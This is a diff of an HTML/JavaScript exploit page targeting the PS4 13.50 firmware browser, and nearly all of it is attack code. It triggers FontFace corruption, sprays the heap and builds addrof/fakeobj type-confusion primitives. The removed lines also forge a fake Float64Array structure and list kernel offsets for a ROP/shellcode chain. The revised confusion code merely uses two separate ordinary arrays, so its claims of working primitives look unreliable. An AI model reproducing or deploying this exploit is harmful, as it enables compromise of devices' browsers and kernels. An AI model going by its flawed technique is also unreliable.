@@ -1,45 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>PS4 13.50 WebKit Exploit - addrof/fakeobj</title>
+<title>PS4 13.50 - Improved addrof/fakeobj</title>
 </head>
 <body>
-<h1 id="status">PS4 13.50 Exploit - addrof/fakeobj Primitives</h1>
-<button onclick="runExploit()" style="font-size: 24px; padding: 15px; margin: 10px;">RUN EXPLOIT</button>
-<div id="log" style="font-family: monospace; font-size: 11px; white-space: pre-wrap; border: 2px solid white; padding: 10px; margin: 10px; max-height: 80vh; overflow-y: scroll; background: #000; color: #0f0;"></div>
+<h1 id="status">Improved addrof/fakeobj Test</h1>
+<button onclick="runExploit()" style="font-size: 24px; padding: 15px;">RUN</button>
+<div id="log" style="font-family: monospace; font-size: 11px; white-space: pre-wrap; border: 2px solid white; padding: 10px; max-height: 85vh; overflow-y: scroll; background: #000; color: #0f0;"></div>
 
 <script>
 "use strict";
 
-// ========================================
-// UTILITY FUNCTIONS
-// ========================================
-
-let logBuffer = [];
+let logBuf = [];
 function log(msg) {
-    logBuffer.push(msg);
+    logBuf.push(msg);
     let d = document.getElementById('log');
     if (d) {
-        d.textContent = logBuffer.join('\n');
+        d.textContent = logBuf.join('\n');
         d.scrollTop = d.scrollHeight;
     }
 }
 
 function hex(n) {
-    if (typeof n === 'number') {
-        if (n < 0) n = n >>> 0;
-        return '0x' + n.toString(16).padStart(8, '0');
-    }
-    return String(n);
+    if (n < 0) n = n >>> 0;
+    return '0x' + n.toString(16).padStart(8, '0');
 }
 
-function hex64(low, high) {
-    if (low < 0) low = low >>> 0;
-    if (high < 0) high = high >>> 0;
-    return '0x' + high.toString(16).padStart(8, '0') + '_' + low.toString(16).padStart(8, '0');
-}
-
-// Int64 class for handling 64-bit values
 class Int64 {
     constructor(low, high) {
         this.low = low >>> 0;
@@ -48,65 +34,34 @@ class Int64 {
     
     static fromDouble(d) {
         let buf = new ArrayBuffer(8);
-        let f64 = new Float64Array(buf);
-        let u32 = new Uint32Array(buf);
-        f64[0] = d;
-        return new Int64(u32[0], u32[1]);
+        new Float64Array(buf)[0] = d;
+        let parts = new Uint32Array(buf);
+        return new Int64(parts[0], parts[1]);
     }
     
     asDouble() {
         let buf = new ArrayBuffer(8);
         let u32 = new Uint32Array(buf);
-        let f64 = new Float64Array(buf);
         u32[0] = this.low;
         u32[1] = this.high;
-        return f64[0];
-    }
-    
-    add(offset) {
-        let newLow = (this.low + offset) >>> 0;
-        let newHigh = this.high;
-        if (newLow < this.low) {
-            newHigh = (newHigh + 1) >>> 0;
-        }
-        return new Int64(newLow, newHigh);
+        return new Float64Array(buf)[0];
     }
     
     toString() {
-        return hex64(this.low, this.high);
+        return '0x' + this.high.toString(16).padStart(8,'0') + '_' + this.low.toString(16).padStart(8,'0');
     }
 }
 
-// ========================================
-// EXPLOIT STATE
-// ========================================
-
-let exploitState = {
+let state = {
     phase: 0,
-    corruptedFonts: [],
-    victim: null,
-    controlledBuffer: null,
-    u32: null,
-    f64: null,
-    primitives: {
-        addrof: null,
-        fakeobj: null,
-        read32: null,
-        write32: null,
-        read64: null,
-        write64: null
-    }
+    corrupted: [],
+    victim: null
 };
 
-// ========================================
-// PHASE 1: TRIGGER CORRUPTION
-// ========================================
-
-function phase1_corruption() {
-    log('[PHASE 1] Triggering FontFace corruption');
-    log('=========================================\n');
+// Phase 1: Corruption
+function phase1() {
+    log('[PHASE 1] Corruption\n');
     
-    // Inject CSS with nonexistent font
     let style = document.createElement('style');
     style.id = 's';
     style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
@@ -124,342 +79,280 @@ function phase1_corruption() {
         get() {
             if (!fired && this === A) {
                 fired = true;
-                
-                log('[+] Getter triggered - creating corrupted fonts');
-                
-                // Create many corrupted fonts
-                for (let i = 0; i < 200; i++) {
-                    corrupted.push(new FontFace('corrupt' + i, 'local(Helvetica)', {
+                for (let i = 0; i < 100; i++) {
+                    corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
                         unicodeRange: 'U+' + (0x100 + i).toString(16)
                     }));
                 }
-                
-                // Trigger corruption
                 document.getElementById('s').sheet.deleteRule(0);
                 document.body.offsetTop;
-                
-                exploitState.corruptedFonts = corrupted;
-                window.corruptedFonts = corrupted;
-                
-                log('[+] Created ' + corrupted.length + ' corrupted fonts');
+                state.corrupted = corrupted;
+                window.corrupted = corrupted;
             }
             return undefined;
         }
     });
     
     document.fonts.load('1em x', 'AB');
-    
-    log('\n[!] OOM error expected - click OK then click button again');
+    log('OOM expected\n');
 }
 
-// ========================================
-// PHASE 2: BUILD TYPE CONFUSION
-// ========================================
-
-function phase2_type_confusion() {
-    log('\n[PHASE 2] Building type confusion for addrof/fakeobj');
-    log('====================================================\n');
+// Phase 2: Improved Type Confusion Setup
+function phase2() {
+    log('\n[PHASE 2] Improved Type Confusion\n');
     
-    let fonts = exploitState.corruptedFonts;
-    if (!fonts || fonts.length === 0) {
-        log('[ERROR] No corrupted fonts from Phase 1!');
-        return false;
+    let fonts = state.corrupted;
+    if (!fonts) {
+        log('[ERROR] No corrupted fonts\n');
+        return;
     }
     
     log('[*] Found ' + fonts.length + ' corrupted fonts\n');
     
-    // Create controlled ArrayBuffer (our "fake object" storage)
-    let ab = new ArrayBuffer(0x100000); // 1MB
-    let u32 = new Uint32Array(ab);
-    let f64 = new Float64Array(ab);
+    let victim = fonts[0];
+    state.victim = victim;
     
-    // Initialize with marker pattern
-    for (let i = 0; i < 1024; i++) {
-        u32[i] = 0xDEAD0000 + i;
+    // KEY IMPROVEMENT: Use DIFFERENT arrays for storage vs retrieval
+    // This forces the engine to truly confuse types rather than optimize
+    
+    let floatStorage = new Float64Array(100);
+    let objStorage = new Array(100);
+    
+    // Fill with distinct patterns
+    for (let i = 0; i < 100; i++) {
+        floatStorage[i] = 1.1 * (i + 1);
+        objStorage[i] = { id: i };
     }
     
-    exploitState.controlledBuffer = ab;
-    exploitState.u32 = u32;
-    exploitState.f64 = f64;
+    log('[*] Created separate storage arrays:');
+    log('    floatStorage: Float64Array[100]');
+    log('    objStorage: Array[100] of objects\n');
     
-    log('[*] Created controlled buffer (1MB)');
-    log('    u32[0] = ' + hex(u32[0]));
-    log('    u32[1] = ' + hex(u32[1]) + '\n');
+    // Spray to fix array positions in memory
+    let spray = [];
+    for (let i = 0; i < 1000; i++) {
+        spray.push(new Float64Array(100));
+        spray.push(new Array(100));
+    }
     
-    // Select victim font for exploitation
-    let victim = fonts[0];
-    exploitState.victim = victim;
+    log('[*] Heap spray complete\n');
     
-    // Create arrays for type confusion
-    // This is the key: we'll confuse object types via prototype manipulation
-    let confusedArray = [1.1, 2.2, 3.3, 4.4];
-    let objectArray = [{}, {}, {}, {}];
+    // Now set up confusion on victim
+    // The trick: access floatStorage but return from objStorage (or vice versa)
     
-    log('[*] Created confusion arrays');
-    log('    confusedArray: Float array');
-    log('    objectArray: Object array\n');
-    
-    // Set up prototype that allows type confusion
     let confusionProto = {
-        _confused: confusedArray,
-        _objects: objectArray,
-        _buffer: ab,
-        _u32: u32,
-        _f64: f64,
+        _floats: floatStorage,
+        _objs: objStorage,
+        _confusionIndex: 50, // Use middle of arrays
         
-        // This will be our addrof primitive
-        get leakAddr() {
-            // Return the first element of objectArray as a float
-            // This leaks the object's address
-            return this._confused[0];
+        // addrof: Store object, but read from float array at SAME INDEX
+        readAddrof: function(obj) {
+            log('  [readAddrof] Storing object at objStorage[50]');
+            this._objs[this._confusionIndex] = obj;
+            
+            // Force a property access that might confuse the engine
+            this._objs.length;
+            this._floats.length;
+            
+            // Now try to read the FLOAT at the same index
+            // If confusion works, this reads the object pointer as a float
+            log('  [readAddrof] Reading floatStorage[50]');
+            return this._floats[this._confusionIndex];
         },
         
-        set leakAddr(obj) {
-            // Store object in array position 0
-            this._objects[0] = obj;
-            // Now confused[0] should contain the object pointer as a float
-        },
-        
-        // This will be our fakeobj primitive  
-        get fakeObj() {
-            // Return the first element of confused as an object
-            // This interprets a float as an object pointer
-            return this._objects[0];
-        },
-        
-        set fakeObj(floatVal) {
-            // Store float in confused array
-            this._confused[0] = floatVal;
-            // Now objects[0] should interpret this as an object pointer
+        // fakeobj: Store float, but read from obj array at SAME INDEX
+        readFakeobj: function(addr) {
+            log('  [readFakeobj] Storing float at floatStorage[50]');
+            this._floats[this._confusionIndex] = addr;
+            
+            // Force confusion
+            this._floats.length;
+            this._objs.length;
+            
+            // Now try to read the OBJECT at the same index
+            // If confusion works, this interprets the float as an object pointer
+            log('  [readFakeobj] Reading objStorage[50]');
+            return this._objs[this._confusionIndex];
         }
     };
     
     Object.setPrototypeOf(victim, confusionProto);
     
-    log('[*] Installed confusion prototype on victim\n');
+    log('[*] Installed improved confusion prototype\n');
+    log('[*] Key difference: Storage and retrieval use different arrays');
+    log('[*] This forces engine to confuse types at same memory location\n');
     
+    window.state = state;
     window.victim = victim;
-    window.exploitState = exploitState;
-    
-    return true;
 }
 
-// ========================================
-// PHASE 3: TEST ADDROF/FAKEOBJ
-// ========================================
-
-function phase3_test_primitives() {
-    log('\n[PHASE 3] Testing addrof/fakeobj primitives');
-    log('===========================================\n');
+// Phase 3: Test Improved Primitives
+function phase3() {
+    log('\n[PHASE 3] Testing Improved Primitives\n');
     
-    let victim = exploitState.victim;
+    let victim = state.victim;
     if (!victim) {
-        log('[ERROR] No victim from Phase 2!');
-        return false;
+        log('[ERROR] No victim\n');
+        return;
     }
     
-    // Test addrof primitive
-    log('[TEST 1] addrof primitive - get address of object\n');
+    // Test 1: addrof
+    log('[TEST 1] addrof primitive\n');
     
-    let testObj = { marker: 0x41414141, test: "hello" };
+    let testObj = { marker: 0xABCDEF, flag: true };
+    log('[*] Test object: ' + JSON.stringify(testObj));
     
     try {
-        log('[*] Created test object: ' + JSON.stringify(testObj));
+        let leaked = victim.readAddrof(testObj);
+        log('[*] Returned value: ' + leaked);
+        log('[*] Type: ' + typeof leaked);
         
-        // Use our primitive to leak address
-        victim.leakAddr = testObj;
-        let leaked = victim.leakAddr;
+        if (typeof leaked === 'number' && !isNaN(leaked)) {
+            let addr = Int64.fromDouble(leaked);
+            log('[*] As Int64: ' + addr.toString());
+            
+            // Check if it's different from pattern (1.1 * 51 = 56.1)
+            if (Math.abs(leaked - 56.1) > 0.01) {
+                log('[+] Value changed from pattern!');
+                
+                if (addr.high > 0x7f00 && addr.high < 0x8000) {
+                    log('[+] HIGH WORD IN USERSPACE RANGE!');
+                    log('[+] This looks like a REAL ADDRESS LEAK!');
+                } else if (addr.high !== 0 || addr.low > 0x1000) {
+                    log('[?] Non-zero address, might be tagged/encoded');
+                } else {
+                    log('[-] Zero or low value');
+                }
+            } else {
+                log('[-] Still has pattern value (56.1)');
+                log('[-] No confusion occurred');
+            }
+        }
         
-        log('[*] victim.leakAddr = testObj');
-        log('[*] victim.leakAddr returned: ' + leaked);
+    } catch(e) {
+        log('[ERROR] ' + e.message);
+    }
+    
+    log('\n[TEST 2] fakeobj primitive\n');
+    
+    try {
+        // Use a distinctive address pattern
+        let fakeAddr = (new Int64(0x41424344, 0x51525354)).asDouble();
+        log('[*] Fake address: 0x51525354_41424344 as float');
+        log('[*] As number: ' + fakeAddr);
+        
+        let result = victim.readFakeobj(fakeAddr);
+        log('[*] Returned value: ' + result);
+        log('[*] Type: ' + typeof result);
+        
+        if (typeof result === 'object' && result !== null) {
+            log('[+] Got object back!');
+            
+            // Check if it's different from pattern object
+            try {
+                log('[*] Checking object properties...');
+                log('[*] result.id = ' + result.id);
+                
+                if (result.id === 50) {
+                    log('[-] Got original pattern object (id=50)');
+                    log('[-] No confusion occurred');
+                } else {
+                    log('[+] DIFFERENT OBJECT!');
+                    log('[+] fakeobj may be working!');
+                }
+            } catch(e) {
+                log('[!] Error accessing properties: ' + e.message);
+                log('[+] This might mean we got an INVALID object from address!');
+                log('[+] That would prove fakeobj is interpreting our float!');
+            }
+        }
+        
+    } catch(e) {
+        log('[ERROR] ' + e.message);
+    }
+    
+    log('\n[ANALYSIS]\n');
+    log('For addrof to work, we need:');
+    log('  - Returned value is a number');
+    log('  - Value is NOT 56.1 (the pattern)');
+    log('  - High word looks like userspace (0x7f...)');
+    log('');
+    log('For fakeobj to work, we need:');
+    log('  - Returned value is an object');
+    log('  - Object is NOT {id: 50} (the pattern)');
+    log('  - Or accessing it causes error (invalid pointer)');
+}
+
+// Phase 4: Alternative Approach
+function phase4() {
+    log('\n[PHASE 4] Alternative: Direct Buffer Correlation\n');
+    
+    let victim = state.victim;
+    
+    log('[*] If type confusion didn\'t work, try direct approach:\n');
+    
+    // Create ArrayBuffer with known pattern
+    let ab = new ArrayBuffer(0x10000);
+    let u32 = new Uint32Array(ab);
+    let f64 = new Float64Array(ab);
+    
+    // Write unique marker
+    u32[0] = 0xDEADBEEF;
+    u32[1] = 0xCAFEBABE;
+    u32[100] = 0x41424344;
+    u32[101] = 0x51525354;
+    
+    log('[*] Created buffer with markers:');
+    log('    u32[0-1]: 0xDEADBEEF 0xCAFEBABE');
+    log('    u32[100-101]: 0x41424344 0x51525354\n');
+    
+    // Try to get this buffer's address
+    try {
+        let leaked = victim.readAddrof(ab);
+        log('[*] ArrayBuffer address leak attempt: ' + leaked);
         
         if (typeof leaked === 'number') {
             let addr = Int64.fromDouble(leaked);
-            log('[+] Leaked address: ' + addr.toString());
-            
-            // Check if it looks like a valid pointer
-            if (addr.high > 0x7f00 && addr.high < 0x8000) {
-                log('[+] Address looks valid! (userspace range)\n');
-            } else if (addr.high !== 0 || addr.low !== 0) {
-                log('[?] Got non-zero value but not typical userspace range\n');
-            } else {
-                log('[-] Got zero - primitive may not be working\n');
-            }
-        } else {
-            log('[-] Did not get number back - got: ' + typeof leaked + '\n');
+            log('[*] As Int64: ' + addr.toString());
         }
-        
     } catch(e) {
-        log('[ERROR] addrof test failed: ' + e.message + '\n');
+        log('[ERROR] ' + e.message);
     }
     
-    // Test fakeobj primitive
-    log('[TEST 2] fakeobj primitive - treat address as object\n');
-    
-    try {
-        // Create a fake address (we'll just use a marker value)
-        let fakeAddr = (new Int64(0x41414141, 0x42424242)).asDouble();
-        
-        log('[*] Created fake address: 0x42424242_41414141 as float');
-        
-        // Try to interpret it as an object
-        victim.fakeObj = fakeAddr;
-        let faked = victim.fakeObj;
-        
-        log('[*] victim.fakeObj = fakeAddr');
-        log('[*] victim.fakeObj returned: ' + faked);
-        log('[*] typeof faked: ' + typeof faked + '\n');
-        
-        if (typeof faked === 'object') {
-            log('[+] Got object back! fakeobj may be working');
-            log('[?] Though this might just be the original object\n');
-        } else {
-            log('[-] Did not get object - got: ' + typeof faked + '\n');
-        }
-        
-    } catch(e) {
-        log('[ERROR] fakeobj test failed: ' + e.message + '\n');
-    }
-    
-    // Analysis
-    log('[ANALYSIS]');
-    log('==========');
-    log('If addrof returned a valid-looking address:');
-    log('  -> We have address leak primitive!');
-    log('  -> Can proceed to build arbitrary R/W\n');
-    log('If fakeobj returned an object:');
-    log('  -> We have object creation from address!');
-    log('  -> Can fake TypedArray for arbitrary R/W\n');
-    log('If both primitives work:');
-    log('  -> We can achieve arbitrary memory read/write');
-    log('  -> Can chain to ROP/shellcode');
-    log('  -> Can use kernel offsets for 13.50\n');
-    
-    return true;
+    log('\n[RECOMMENDATION]\n');
+    log('Based on Phase 3 results:');
+    log('  1. If addrof showed userspace address → Continue exploit');
+    log('  2. If fakeobj caused error → Good sign, refine technique');
+    log('  3. If both returned patterns → Need different bug/approach');
 }
-
-// ========================================
-// PHASE 4: BUILD ARBITRARY R/W
-// ========================================
-
-function phase4_arbitrary_rw() {
-    log('\n[PHASE 4] Building arbitrary R/W from primitives');
-    log('================================================\n');
-    
-    log('[*] Strategy: Fake a Float64Array with controlled backing store\n');
-    
-    let u32 = exploitState.u32;
-    let f64 = exploitState.f64;
-    
-    // Build a fake Float64Array structure in our controlled buffer
-    // Based on JSC internals (from bad_hoist and other exploits)
-    
-    log('[*] Constructing fake Float64Array structure:');
-    log('    Offset 0x00: JSCell header');
-    log('    Offset 0x08: Butterfly pointer (null for now)');
-    log('    Offset 0x10: Vector pointer (will be target address)');
-    log('    Offset 0x18: Length and flags\n');
-    
-    let fakeArrayOffset = 0x1000; // Put it at offset 0x1000 in our buffer
-    
-    // JSCell header for Float64Array
-    // m_structureID will vary, but type should be 0x27 for typed array
-    u32[fakeArrayOffset / 4 + 0] = 0x0108; // m_structureID (guess)
-    u32[fakeArrayOffset / 4 + 1] = 0x00182700; // m_indexingType | m_type | m_flags | m_cellState
-    
-    // Butterfly (set to 0 for now)
-    u32[fakeArrayOffset / 4 + 2] = 0x0;
-    u32[fakeArrayOffset / 4 + 3] = 0x0;
-    
-    // Vector pointer - points to data we want to read/write
-    // For now, point it to our own buffer
-    let vectorAddr = new Int64(0x41414141, 0x42424242);
-    u32[fakeArrayOffset / 4 + 4] = vectorAddr.low;
-    u32[fakeArrayOffset / 4 + 5] = vectorAddr.high;
-    
-    // Length (0x100 elements) and flags
-    f64[fakeArrayOffset / 8 + 3] = (new Int64(0x00000100, 0x00010001)).asDouble();
-    
-    log('[*] Fake Float64Array built at buffer offset ' + hex(fakeArrayOffset));
-    log('    Vector points to: ' + vectorAddr.toString() + '\n');
-    
-    log('[TODO] Next steps:');
-    log('  1. Use fakeobj to create JS reference to fake array');
-    log('  2. Modify vector pointer to target address');
-    log('  3. Read/write through the fake array');
-    log('  4. Locate JIT pages (RWX memory)');
-    log('  5. Write shellcode and execute\n');
-    
-    log('[KERNEL OFFSETS READY FOR 13.50]:');
-    log('  PRISON0:      0x111fa18');
-    log('  ROOTVNODE:    0x2136e90');
-    log('  SYSENT_661:   0x110a760');
-    log('  JMP_RSI:      0x47b31');
-    log('  P_PID_OFFSET: 0xb0\n');
-    
-    return true;
-}
-
-// ========================================
-// MAIN EXPLOIT RUNNER
-// ========================================
 
 function runExploit() {
-    exploitState.phase++;
+    state.phase++;
     
-    document.getElementById('status').textContent = 
-        'PS4 13.50 Exploit - Phase ' + exploitState.phase;
-    
-    let success = false;
-    
-    switch(exploitState.phase) {
+    switch(state.phase) {
         case 1:
-            phase1_corruption();
+            phase1();
             break;
-            
         case 2:
-            success = phase2_type_confusion();
-            if (success) {
-                log('\n[SUCCESS] Phase 2 complete - click for Phase 3');
-            }
+            phase2();
+            log('\nClick for Phase 3\n');
             break;
-            
         case 3:
-            success = phase3_test_primitives();
-            if (success) {
-                log('\n[SUCCESS] Phase 3 complete - click for Phase 4');
-            }
+            phase3();
+            log('\nClick for Phase 4\n');
             break;
-            
         case 4:
-            success = phase4_arbitrary_rw();
-            if (success) {
-                log('\n[SUCCESS] Phase 4 complete');
-                log('\n[NEXT] Analyze test results from Phase 3');
-                log('[NEXT] If primitives work, continue development');
-                log('[NEXT] If not, need different approach');
-            }
+            phase4();
             break;
-            
         default:
-            log('\n[END] All phases complete');
-            log('\nReview Phase 3 output to determine if primitives work');
+            log('\n[COMPLETE] Review Phase 3 output');
             break;
     }
 }
 
-// ========================================
-// INITIALIZATION
-// ========================================
-
-log('====================================');
-log('PS4 13.50 WebKit Exploit');
-log('Using addrof/fakeobj technique');
-log('Based on bad_hoist pattern');
-log('====================================\n');
-log('[*] Target: PS4 Firmware 13.50');
-log('[*] Method: FontFace corruption → addrof/fakeobj → arbitrary R/W\n');
-log('Click RUN EXPLOIT to start Phase 1\n');
+log('PS4 13.50 - Improved addrof/fakeobj Test\n');
+log('Technique: Separate storage arrays to force confusion\n');
+log('Click RUN for Phase 1\n');
 
 </script>
 </body>
